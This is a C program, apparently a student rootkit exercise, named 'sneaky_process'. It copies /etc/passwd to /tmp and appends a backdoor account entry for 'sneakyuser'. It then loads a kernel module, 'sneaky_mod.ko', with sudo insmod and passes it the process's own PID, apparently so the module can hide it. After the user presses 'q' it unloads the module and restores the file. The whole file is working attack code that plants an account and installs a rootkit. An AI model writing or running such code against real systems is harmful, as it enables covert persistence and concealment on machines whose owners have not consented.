#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
int main(){
  printf("sneaky_process pid=%d\n", getpid());
  //1. copy contents from souces file to tmp_file
  FILE* source_file;
  source_file = fopen("/etc/passwd", "r");
  if(source_file == NULL){
    perror("failed to open the source file");
  }
  FILE* tmp_file;
  tmp_file = fopen("/tmp/passwd", "w+");
  if(tmp_file == NULL){
    perror("failed to open destination file");
  }
  char* line = NULL;
  size_t len = 0;
  while(getline(&line, &len, source_file) != -1){
    if(line != NULL){
      fprintf(tmp_file, "%s", line);
    }
    line = NULL;
    len = 0;
  }
  if(fclose(tmp_file) != 0){
    perror("Failed to close tmp file.");
  }
  if(fclose(source_file) != 0){
    perror("Failed to close source file.");
  }
  //2. write a newline to source file
  char* add = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
  source_file = fopen("/etc/passwd", "a");
  fprintf(source_file, "%s", add);
  if(fclose(source_file) != 0){
    perror("Failed to close the source file");
  }
  //3. load a sneaky module   with fork() and exev()
  pid_t pid = fork();
  int status_load;
  if(pid < 0){
    perror("Failed to fork\n");
  }
  if(pid == 0){
    char** argv_load = malloc(5* sizeof(char*));
    pid_t currPID = getppid();
    char currPID_str[50];
    sprintf(currPID_str, "%d", currPID);
    char dest[64];
    strcpy(dest, "currPID=");
    strncat(dest, currPID_str, 50);
    argv_load[0] = "sudo";
    argv_load[1] = "insmod";
    argv_load[2] = "sneaky_mod.ko";
    argv_load[3] = dest;
    argv_load[4] = NULL;
    if(execvp(argv_load[0], argv_load) == -1){
      perror("Failed to execute.");
      exit(EXIT_FAILURE);
    }
    for(int i = 0; i < 5; i++){
      argv_load[i] = NULL;
    }
    free(argv_load);
  }
  if(pid > 0){
    //in parent, wait until child process exits
    wait(&status_load);
  }
  //4. reading characters from keyboard until q
  char input;
  do{
    input = getchar();
  }while(input != 'q');
  //5. unload the LKM  with fork() and exev()
  pid = fork();
  int status_unload;
  if(pid < 0){
    perror("Failed to fork\n");
  }
  if(pid == 0){
    char** argv_unload = malloc(4* sizeof(char*)) ;
    argv_unload[0] = "sudo";
    argv_unload[1] = "rmmod";
    argv_unload[2] = "sneaky_mod";
    argv_unload[3] = NULL;
    if(execvp(argv_unload[0], argv_unload) == -1){
      perror("Failed to execute.\n");
      exit(EXIT_FAILURE);
    }
    for(int i  =0; i < 4; i++){
      argv_unload[i] = NULL;
    }
    free(argv_unload);
  }
  if(pid > 0){
    wait(&status_unload);
  }
  //6. copy back the original copy
  tmp_file = fopen("/tmp/passwd","r");
  if (tmp_file == NULL) {
    perror("failed to open tmp_file");
  }
  source_file = fopen("/etc/passwd", "w");
  if (source_file == NULL) {
    perror("failed to open source_file");
  }
  while(getline(&line, &len, tmp_file) != -1){
    if(line != NULL){
      fprintf(source_file, "%s", line);
    }
    line = NULL;
    len = 0;
  }
  if (fclose(tmp_file) != 0) {
    perror("failed to close tmp_file");
  }
  if (fclose(source_file) != 0) {
    perror("failed to close source_file");
  }
}
